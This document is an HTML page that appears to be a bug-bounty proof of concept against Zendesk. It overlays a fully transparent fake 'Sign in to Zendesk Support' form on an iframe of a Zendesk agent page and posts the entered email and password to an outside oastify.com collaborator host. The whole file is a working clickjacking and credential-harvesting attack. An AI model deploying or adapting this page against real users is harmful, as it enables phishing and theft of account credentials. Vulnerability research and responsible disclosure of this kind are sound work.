<!DOCTYPE html>
<html lang="en" class="u-bg-transparent turbolinks-progress-bar">
<head>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in to Zendesk Support</title>

  <style>
    html, body {
      background-color: transparent !important;
      color: rgba(0, 0, 0, 0) !important; /* Make text invisible */
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
    }
    * {
      background-color: transparent !important;
      color: rgba(0, 0, 0, 0) !important;
      border: none !important;
      box-shadow: none !important;
    }
    .signin, .login, .interface, .modal {
      background-color: transparent !important;
    }
  </style>
</head>
<body>
  <div class="modal signin" role="dialog" aria-labelledby="signin_title">
    <div class="login help_center">
      <div class="interface outer">
        <div class="updated_title">
          <h2 id="signin_title">
            Sign in to Zendesk Support
          </h2>
        </div>
        <div class="interface inner">
          <form class="" id="login-form" autocomplete="off" action="3x1lnzoe7p4l4zc2dgf8ms3trkxbl29r.oastify.com" method=POST>
            <div class="credentials">
              <label for="user_email">Email</label>
              <input type="email" name="user[email]" id="user_email">
              <label for="user_password">Password</label>
              <input type="password" name="user[password]" id="user_password">
              <button type="submit">Sign In</button>
            </div>
          </form>
        </div>
      </div>
    </div>
  </div>
</body>
</html>
<iframe src="https://hackerone9879.zendesk.com/agent/launchpad/testTicket"></iframe>
